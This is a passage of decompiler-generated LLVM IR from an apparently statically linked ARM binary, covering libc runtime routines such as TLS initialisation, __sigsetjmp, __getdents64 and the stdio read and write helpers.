  uselistorder i32* %v1_18b00, { 1, 0 }
  uselistorder i32 %v0_18aac, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_18aa8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18a9c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 12, 3, 5, 4, 6, 7, 8, 9, 10, 11, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10752, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 7, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 10240, { 3, 4, 8, 5, 9, 2, 10, 1, 11, 6, 12, 7, 13, 0, 14 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 3, 2, 1, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_18c74, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_18b44, { 1, 0 }
  uselistorder label %dec_label_pc_18b40, { 1, 0 }
  uselistorder label %dec_label_pc_18ac4, { 1, 0 }
}

define i32 @function_18c94(i32 %arg1) local_unnamed_addr {
dec_label_pc_18c94:
  %v0_18c94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18c94, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_18c94
  %v1_18c98 = load i32, i32* @ip, align 4
  %v1_18ca8 = load i32, i32* @r5, align 4
  %v2_18ca8 = and i32 %v1_18ca8, 101552
  %v2_18cac = load i32, i32* @r4, align 4
  %v8_18cac = ashr i32 %v2_18cac, %v2_18ca8
  %v9_18cac = and i32 %v8_18cac, %v2_18ca8
  %v8_18cb0 = lshr i32 %v1_18c98, %v9_18cac
  %v9_18cb0 = and i32 %v8_18cb0, %v9_18cac
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_18c94, %bb
  %v7_18cb4 = phi i32 [ %arg1, %dec_label_pc_18c94 ], [ %v9_18cb0, %bb ]
  ret i32 %v7_18cb4

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18cc0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18cc0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v4_18cd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 156) to i32*), align 4
  %v4_18cd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 104) to i32*), align 4
  store i32 %v4_18cd8, i32* %r1.global-to-local, align 4
  %v1_18cdc = add i32 %arg1, 44
  %v2_18cdc = inttoptr i32 %v1_18cdc to i32*
  %v3_18cdc = load i32, i32* %v2_18cdc, align 4
  %v1_18ce0 = add i32 %arg1, 28
  %v2_18ce0 = inttoptr i32 %v1_18ce0 to i32*
  %v3_18ce0 = load i32, i32* %v2_18ce0, align 4
  store i32 %v3_18ce0, i32* %r2.global-to-local, align 4
  %v2_18ce4 = inttoptr i32 %v4_18cd0 to i32*
  store i32 %v3_18cdc, i32* %v2_18ce4, align 4
  %v0_18ce8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ce8 = load i32, i32* %r1.global-to-local, align 4
  %v2_18ce8 = inttoptr i32 %v1_18ce8 to i32*
  store i32 %v0_18ce8, i32* %v2_18ce8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 6, 8, 3, 7, 4, 9, 5, 10 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18cf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_18cf4:
  %v0_18cf4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18cf4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18cf4
  %v1_18cf4 = load i32, i32* @ip, align 4
  %v3_18cf4 = mul i32 %v1_18cf4, %arg1
  %v2_18cf8 = load i32, i32* @r8, align 4
  %v4_18cf8 = and i32 %v2_18cf8, %v3_18cf4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18cf4, %bb
  %v5_18cf8 = phi i32 [ %arg1, %dec_label_pc_18cf4 ], [ %v4_18cf8, %bb ]
  ret i32 %v5_18cf8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18d04 = add i32 %arg1, 40
  store i32 %v1_18d04, i32* %r2.global-to-local, align 4
  %v1_18d08 = inttoptr i32 %v1_18d04 to i32*
  %v2_18d08 = load i32, i32* %v1_18d08, align 4
  store i32 %v2_18d08, i32* %r2.global-to-local, align 4
  %v3_18d08 = add i32 %arg1, 44
  %v4_18d08 = inttoptr i32 %v3_18d08 to i32*
  %v5_18d08 = load i32, i32* %v4_18d08, align 4
  store i32 %v5_18d08, i32* %r3.global-to-local, align 4
  %v0_18d0c = call i32 @__aeabi_read_tp()
  %v1_18d10 = inttoptr i32 %v0_18d0c to i32*
  %v2_18d10 = load i32, i32* %v1_18d10, align 4
  store i32 %v2_18d10, i32* %r1.global-to-local, align 4
  %v3_18d14 = mul i32 %v5_18d08, 8
  store i32 %v3_18d14, i32* %r3.global-to-local, align 4
  %v1_18d18 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d18 = add i32 %v1_18d18, %v0_18d0c
  %v3_18d1c = add i32 %v3_18d14, %v2_18d10
  %v4_18d1c = inttoptr i32 %v3_18d1c to i32*
  store i32 %v2_18d18, i32* %v4_18d1c, align 4
  %v0_18d20 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d20 = load i32, i32* %r1.global-to-local, align 4
  %v2_18d20 = add i32 %v1_18d20, %v0_18d20
  store i32 %v2_18d20, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_18d28 = add i32 %v2_18d20, 4
  %v5_18d28 = inttoptr i32 %v4_18d28 to i8*
  store i8 1, i8* %v5_18d28, align 1
  %v0_18d2c = load i32, i32* @r4, align 4
  %v1_18d2c = add i32 %v0_18d2c, 20
  store i32 %v1_18d2c, i32* %r1.global-to-local, align 4
  %v1_18d30 = inttoptr i32 %v1_18d2c to i32*
  %v2_18d30 = load i32, i32* %v1_18d30, align 4
  store i32 %v2_18d30, i32* @r1, align 4
  %v3_18d30 = add i32 %v0_18d2c, 24
  %v4_18d30 = inttoptr i32 %v3_18d30 to i32*
  %v5_18d30 = load i32, i32* %v4_18d30, align 4
  store i32 %v5_18d30, i32* %r2.global-to-local, align 4
  %v5_18d34 = call i32 @__GI_mempcpy(i32 %v2_18d18, i32 %v2_18d30, i32 %v5_18d30, i32 1)
  %v0_18d38 = load i32, i32* @r4, align 4
  %v1_18d38 = add i32 %v0_18d38, 28
  store i32 %v1_18d38, i32* %r3.global-to-local, align 4
  %v1_18d3c = inttoptr i32 %v1_18d38 to i32*
  %v2_18d3c = load i32, i32* %v1_18d3c, align 4
  store i32 %v2_18d3c, i32* %r2.global-to-local, align 4
  %v3_18d3c = add i32 %v0_18d38, 24
  %v4_18d3c = inttoptr i32 %v3_18d3c to i32*
  %v5_18d3c = load i32, i32* %v4_18d3c, align 4
  store i32 %v5_18d3c, i32* %r3.global-to-local, align 4
  %v2_18d40 = sub i32 %v5_18d3c, %v2_18d3c
  store i32 %v2_18d40, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18d48 = inttoptr i32 %v5_18d34 to i8*
  %v4_18d48 = call i32 @__GI_memset(i8* %v3_18d48, i32 0, i32 %v2_18d40)
  ret i32 %v4_18d48

; uselistorder directives
  uselistorder i32 %v3_18d14, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 12, 11, 9, 6, 7, 8, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_18d98:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 11580) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_18dac = load i32, i32* @r0, align 4
  %v1_18db0 = inttoptr i32 %v0_18dac to i32*
  %v2_18db0 = load i32, i32* @r4, align 4
  store i32 %v2_18db0, i32* %v1_18db0, align 4
  %v3_18db0 = add i32 %v0_18dac, 4
  %v4_18db0 = inttoptr i32 %v3_18db0 to i32*
  %v5_18db0 = load i32, i32* @r5, align 4
  store i32 %v5_18db0, i32* %v4_18db0, align 4
  %v6_18db0 = add i32 %v0_18dac, 8
  %v7_18db0 = inttoptr i32 %v6_18db0 to i32*
  %v8_18db0 = load i32, i32* @r6, align 4
  store i32 %v8_18db0, i32* %v7_18db0, align 4
  %v9_18db0 = add i32 %v0_18dac, 12
  %v10_18db0 = inttoptr i32 %v9_18db0 to i32*
  %v11_18db0 = load i32, i32* @r7, align 4
  store i32 %v11_18db0, i32* %v10_18db0, align 4
  %v12_18db0 = add i32 %v0_18dac, 16
  %v13_18db0 = inttoptr i32 %v12_18db0 to i32*
  %v14_18db0 = load i32, i32* @r8, align 4
  store i32 %v14_18db0, i32* %v13_18db0, align 4
  %v15_18db0 = add i32 %v0_18dac, 20
  %v16_18db0 = inttoptr i32 %v15_18db0 to i32*
  %v17_18db0 = load i32, i32* @sb, align 4
  store i32 %v17_18db0, i32* %v16_18db0, align 4
  %v18_18db0 = add i32 %v0_18dac, 24
  %v19_18db0 = inttoptr i32 %v18_18db0 to i32*
  %v20_18db0 = load i32, i32* @sl, align 4
  store i32 %v20_18db0, i32* %v19_18db0, align 4
  %v21_18db0 = add i32 %v0_18dac, 28
  %v22_18db0 = inttoptr i32 %v21_18db0 to i32*
  %v23_18db0 = load i32, i32* @fp, align 4
  store i32 %v23_18db0, i32* %v22_18db0, align 4
  %v24_18db0 = add i32 %v0_18dac, 32
  %v25_18db0 = inttoptr i32 %v24_18db0 to i32*
  %v27_18db0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_18db0, i32* %v25_18db0, align 4
  %v28_18db0 = add i32 %v0_18dac, 36
  %v29_18db0 = inttoptr i32 %v28_18db0 to i32*
  %v30_18db0 = load i32, i32* @lr, align 4
  store i32 %v30_18db0, i32* %v29_18db0, align 4
  %v0_18db4 = call i32 @__sigjmp_save()
  ret i32 %v0_18db4

; uselistorder directives
  uselistorder i32 %v0_18dac, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 95, 96, 3, 4, 5, 6, 7, 8, 9, 10, 82, 83, 84, 85, 91, 93, 92, 94, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 30, 31, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0, 48, 49, 50, 51, 52, 53, 54, 1, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 86, 87, 88, 2, 89, 90, 97 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_18dbc = load i32, i32* @r5, align 4
  %v12_18dbc = load i32, i32* @r7, align 4
  %v1_18dc0 = add i32 %arg3, 14
  %v2_18dc8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_18dcc = and i32 %v1_18dc0, -8
  %v2_18dd0 = sub i32 %v2_18dc8, %v1_18dcc
  %v1_18dd4 = add i32 %v2_18dd0, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18e18, label %dec_label_pc_18dfc

dec_label_pc_18dfc:                               ; preds = %entry
  %v1_18e00 = sub i32 0, %arg1
  %v3_18e04 = load i16, i16* @global_var_233d0.483, align 2
  %v4_18e04 = sext i16 %v3_18e04 to i32
  %v0_18e08 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18e10 = add i32 %v4_18e04, %v0_18e08
  %v4_18e10 = inttoptr i32 %v3_18e10 to i32*
  store i32 %v1_18e00, i32* %v4_18e10, align 4
  br label %dec_label_pc_18ee8

dec_label_pc_18e18:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18ee8, label %dec_label_pc_18e20

dec_label_pc_18e20:                               ; preds = %dec_label_pc_18e18
  %v2_18e20 = add i32 %v1_18dd4, %arg1
  store i32 %v2_18e20, i32* %r1.global-to-local, align 4
  %v2_18e24 = add i32 %tmp, %arg3
  store i32 %v1_18dd4, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18ed0

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18ed0
  %v1_18e40 = add i32 %v0_18ea0, 16
  %v2_18e40 = inttoptr i32 %v1_18e40 to i16*
  %v3_18e40 = load i16, i16* %v2_18e40, align 2
  %v4_18e40 = zext i16 %v3_18e40 to i32
  %v1_18e44 = add nsw i32 %v4_18e40, -19
  store i32 %v1_18e44, i32* @r2, align 4
  %v1_18e48 = add nuw nsw i32 %v4_18e40, 7
  %v1_18e4c = and i32 %v1_18e48, 131064
  store i32 %v1_18e4c, i32* @ip, align 4
  %v2_18e54 = add i32 %v1_18e4c, %v0_18ea8
  store i32 %v2_18e54, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_18e54, %v2_18e24
  br i1 %tmp24, label %dec_label_pc_18e60, label %dec_label_pc_18e9c

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e40
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18e68 = load i32, i32* %r8.global-to-local, align 4
  %v0_18e6c = load i32, i32* %sb.global-to-local, align 4
  %v1_18e70 = load i32, i32* @sp, align 4
  %v2_18e70 = inttoptr i32 %v1_18e70 to i32*
  store i32 0, i32* %v2_18e70, align 4
  %v4_18e74 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_18e68, i32 %v0_18e6c)
  %v0_18e78 = load i32, i32* @r5, align 4
  %v1_18e78 = load i32, i32* %sl.global-to-local, align 4
  %v9_18e78 = icmp eq i32 %v0_18e78, %v1_18e78
  br i1 %v9_18e78, label %dec_label_pc_18e80, label %dec_label_pc_18ee4

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18e60
  %v0_18e84 = call i32 @__aeabi_read_tp()
  %v3_18e88 = load i16, i16* @global_var_233d0.483, align 2
  %v4_18e88 = sext i16 %v3_18e88 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18e94 = add i32 %v4_18e88, %v0_18e84
  %v4_18e94 = inttoptr i32 %v3_18e94 to i32*
  store i32 22, i32* %v4_18e94, align 4
  br label %dec_label_pc_18ee8

dec_label_pc_18e9c:                               ; preds = %dec_label_pc_18e40
  %v1_18e9c = inttoptr i32 %v0_18ea0 to i32*
  %v2_18e9c = load i32, i32* %v1_18e9c, align 4
  %v3_18e9c = add i32 %v0_18ea0, 4
  %v4_18e9c = inttoptr i32 %v3_18e9c to i32*
  %v5_18e9c = load i32, i32* %v4_18e9c, align 4
  store i32 %v5_18e9c, i32* @r4, align 4
  %v1_18ea0 = add i32 %v0_18ea0, 8
  store i32 %v1_18ea0, i32* %r8.global-to-local, align 4
  %v1_18ea4 = inttoptr i32 %v1_18ea0 to i32*
  %v2_18ea4 = load i32, i32* %v1_18ea4, align 4
  store i32 %v2_18ea4, i32* %r8.global-to-local, align 4
  %v3_18ea4 = add i32 %v0_18ea0, 12
  %v4_18ea4 = inttoptr i32 %v3_18ea4 to i32*
  %v5_18ea4 = load i32, i32* %v4_18ea4, align 4
  store i32 %v5_18ea4, i32* %sb.global-to-local, align 4
  %v1_18ea8 = inttoptr i32 %v0_18ea8 to i32*
  store i32 %v2_18e9c, i32* %v1_18ea8, align 4
  %v3_18ea8 = add i32 %v0_18ea8, 4
  %v4_18ea8 = inttoptr i32 %v3_18ea8 to i32*
  %v5_18ea8 = load i32, i32* @r4, align 4
  store i32 %v5_18ea8, i32* %v4_18ea8, align 4
  %v0_18eac = load i32, i32* %r8.global-to-local, align 4
  %v1_18eac = load i32, i32* @r5, align 4
  %v2_18eac = add i32 %v1_18eac, 8
  %v3_18eac = inttoptr i32 %v2_18eac to i32*
  store i32 %v0_18eac, i32* %v3_18eac, align 4
  %v0_18eb0 = load i32, i32* %sb.global-to-local, align 4
  %v1_18eb0 = load i32, i32* @r5, align 4
  %v2_18eb0 = add i32 %v1_18eb0, 12
  %v3_18eb0 = inttoptr i32 %v2_18eb0 to i32*
  store i32 %v0_18eb0, i32* %v3_18eb0, align 4
  %v0_18eb4 = load i32, i32* @ip, align 4
  %v1_18eb4 = trunc i32 %v0_18eb4 to i16
  %v2_18eb4 = load i32, i32* @r5, align 4
  %v3_18eb4 = add i32 %v2_18eb4, 16
  %v4_18eb4 = inttoptr i32 %v3_18eb4 to i16*
  store i16 %v1_18eb4, i16* %v4_18eb4, align 2
  %v0_18eb8 = load i32, i32* @r7, align 4
  %v1_18eb8 = add i32 %v0_18eb8, 18
  %v2_18eb8 = inttoptr i32 %v1_18eb8 to i8*
  %v3_18eb8 = load i8, i8* %v2_18eb8, align 1
  %v4_18eb8 = zext i8 %v3_18eb8 to i32
  store i32 %v4_18eb8, i32* @r3, align 4
  %v2_18ebc = load i32, i32* @r5, align 4
  %v3_18ebc = add i32 %v2_18ebc, 18
  %v4_18ebc = inttoptr i32 %v3_18ebc to i8*
  store i8 %v3_18eb8, i8* %v4_18ebc, align 1
  %v0_18ec0 = call i32 @memcpy()
  %v0_18ec4 = load i32, i32* @r7, align 4
  %v1_18ec4 = add i32 %v0_18ec4, 16
  %v2_18ec4 = inttoptr i32 %v1_18ec4 to i16*
  %v3_18ec4 = load i16, i16* %v2_18ec4, align 2
  %v4_18ec4 = zext i16 %v3_18ec4 to i32
  %v0_18ec8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18ec8, i32* @r5, align 4
  %v2_18ecc = add i32 %v4_18ec4, %v0_18ec4
  store i32 %v2_18ecc, i32* @r7, align 4
  br label %dec_label_pc_18ed0

dec_label_pc_18ed0:                               ; preds = %dec_label_pc_18e20, %dec_label_pc_18e9c
  %v0_18ea8 = phi i32 [ %tmp, %dec_label_pc_18e20 ], [ %v0_18ec8, %dec_label_pc_18e9c ]
  %v0_18ea0 = phi i32 [ %v1_18dd4, %dec_label_pc_18e20 ], [ %v2_18ecc, %dec_label_pc_18e9c ]
  %v3_18ed4 = icmp ult i32 %v0_18ea0, %v2_18e20
  %v1_18ed8 = add i32 %v0_18ea8, 19
  store i32 %v1_18ed8, i32* @r0, align 4
  %v1_18edc = add i32 %v0_18ea0, 19
  store i32 %v1_18edc, i32* @r1, align 4
  br i1 %v3_18ed4, label %dec_label_pc_18e40, label %dec_label_pc_18ee4.loopexit

dec_label_pc_18ee4.loopexit:                      ; preds = %dec_label_pc_18ed0
  %v0_18ee4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18ee4

dec_label_pc_18ee4:                               ; preds = %dec_label_pc_18ee4.loopexit, %dec_label_pc_18e60
  %v1_18ee4 = phi i32 [ %v0_18ea8, %dec_label_pc_18ee4.loopexit ], [ %v0_18e78, %dec_label_pc_18e60 ]
  %v0_18ee4 = phi i32 [ %v0_18ee4.pre, %dec_label_pc_18ee4.loopexit ], [ %v1_18e78, %dec_label_pc_18e60 ]
  %v2_18ee4 = sub i32 %v1_18ee4, %v0_18ee4
  store i32 %v2_18ee4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ee8

dec_label_pc_18ee8:                               ; preds = %dec_label_pc_18e18, %dec_label_pc_18e80, %dec_label_pc_18dfc, %dec_label_pc_18ee4
  %v0_18ee8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_18dbc, i32* @r5, align 4
  store i32 %v12_18dbc, i32* @r7, align 4
  ret i32 %v0_18ee8

; uselistorder directives
  uselistorder i32 %v0_18ea0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18ea8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18dd4, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 3, 4, 0, 1, 5, 6, 7, 2, 8 }
  uselistorder i32 18, { 6, 7, 2, 8, 5, 3, 9, 10, 4, 11, 0, 12, 1, 13 }
  uselistorder i32 22, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 4, 3, 2, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_18ee8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18ed0, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18f00 = load i32, i32* @r4, align 4
  store i32 %v3_18f00, i32* %stack_var_-12, align 4
  %v0_18f04 = load i32, i32* %r0.global-to-local, align 4
  %v1_18f04 = inttoptr i32 %v0_18f04 to i16*
  %v2_18f04 = load i16, i16* %v1_18f04, align 2
  %v3_18f04 = zext i16 %v2_18f04 to i32
  store i32 %v3_18f04, i32* @r3, align 4
  %v1_18f08 = and i32 %v3_18f04, 4
  store i32 %v1_18f08, i32* @r5, align 4
  %v2_18f08 = icmp eq i32 %v1_18f08, 0
  store i32 %v0_18f04, i32* @r4, align 4
  br i1 %v2_18f08, label %dec_label_pc_18f1c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18f1c:                               ; preds = %entry
  %v1_18f1c = icmp slt i32 %arg2, 0
  br i1 %v1_18f1c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18f1c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18f1c, %bb18
  %v1_18f24 = add i32 %v0_18f04, 4
  %v2_18f24 = inttoptr i32 %v1_18f24 to i32*
  %v3_18f24 = load i32, i32* %v2_18f24, align 4
  store i32 %v3_18f24, i32* %r0.global-to-local, align 4
  %v1_18f28 = call i32 @__libc_read(i32 %v3_18f24)
  store i32 %v1_18f28, i32* %r0.global-to-local, align 4
  %v5_18f30 = icmp sgt i32 %v1_18f28, 0
  br i1 %v5_18f30, label %.thread7, label %dec_label_pc_18f34

dec_label_pc_18f34:                               ; preds = %bb19
  %v2_18f2c = icmp eq i32 %v1_18f28, 0
  %v0_18f34 = load i32, i32* @r4, align 4
  %v1_18f34 = inttoptr i32 %v0_18f34 to i16*
  %v2_18f34 = load i16, i16* %v1_18f34, align 2
  br i1 %v2_18f2c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18f34
  %v2_18f38 = or i16 %v2_18f34, 4
  store i16 %v2_18f38, i16* %v1_18f34, align 2
  %v1_18f54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18f34
  %v2_18f3c = or i16 %v2_18f34, 8
  store i16 %v2_18f3c, i16* %v1_18f34, align 2
  %v1_18f48 = load i32, i32* @r5, align 4
  store i32 %v1_18f48, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18f54 = phi i32 [ %v1_18f54.pre, %bb20 ], [ 0, %bb ], [ %v1_18f28, %bb19 ], [ %v1_18f48, %bb21 ]
  %v2_18f50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18f50, i32* @r4, align 4
  ret i32 %v1_18f54

; uselistorder directives
  uselistorder i16 %v2_18f34, { 1, 0 }
  uselistorder i32 %v1_18f28, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1901c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1901c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1901c2, label %dec_label_pc_19024, label %dec_label_pc_18f74

dec_label_pc_18f74:                               ; preds = %entry, %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge
  %v0_18f80 = phi i32 [ %v0_18f80.pre, %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge ], [ %tmp, %entry ]
  %v0_18f7c = phi i32 [ %v5_18f8c, %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge ], [ %arg2, %entry ]
  %v3_18f74 = phi i32 [ %v3_18f74.pre, %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge ], [ 2147483647, %entry ]
  %v0_18f78.in = phi i32 [ %v5_18f90, %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge ], [ %arg3, %entry ]
  %v3_18f78 = phi i32 [ %v5_18f90, %dec_label_pc_1901cthread-pre-split.dec_label_pc_18f74_crit_edge ], [ %arg3, %entry ]
  %v0_18f78 = icmp slt i32 %v0_18f78.in, 0
  %storemerge = select i1 %v0_18f78, i32 %v3_18f74, i32 %v3_18f78
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_18f7c, i32* %r1.global-to-local, align 4
  %v1_18f80 = add i32 %v0_18f80, 4
  %v2_18f80 = inttoptr i32 %v1_18f80 to i32*
  %v3_18f80 = load i32, i32* %v2_18f80, align 4
  %v3_18f84 = call i32 @__GI___libc_write(i32 %v3_18f80, i32 %v0_18f7c)
  %v1_18f88 = icmp slt i32 %v3_18f84, 0
  %v2_18f88 = icmp eq i32 %v3_18f84, 0
  store i1 %v2_18f88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18f88, label %dec_label_pc_18f98, label %dec_label_pc_1901cthread-pre-split

dec_label_pc_18f98:                               ; preds = %dec_label_pc_18f74
  %v0_18f98 = load i32, i32* @r4, align 4
  %v1_18f98 = inttoptr i32 %v0_18f98 to i16*
  %v2_18f98 = load i16, i16* %v1_18f98, align 2
  %v1_18f9c = or i16 %v2_18f98, 8
  store i16 %v1_18f9c, i16* %v1_18f98, align 2
  store i32 ptrtoint (i32* @global_var_a41c.817 to i32), i32* %r3.global-to-local, align 4
  %v0_18fa8 = call i32 @__aeabi_read_tp()
  %v3_18fac = load i16, i16* @global_var_233d0.483, align 2
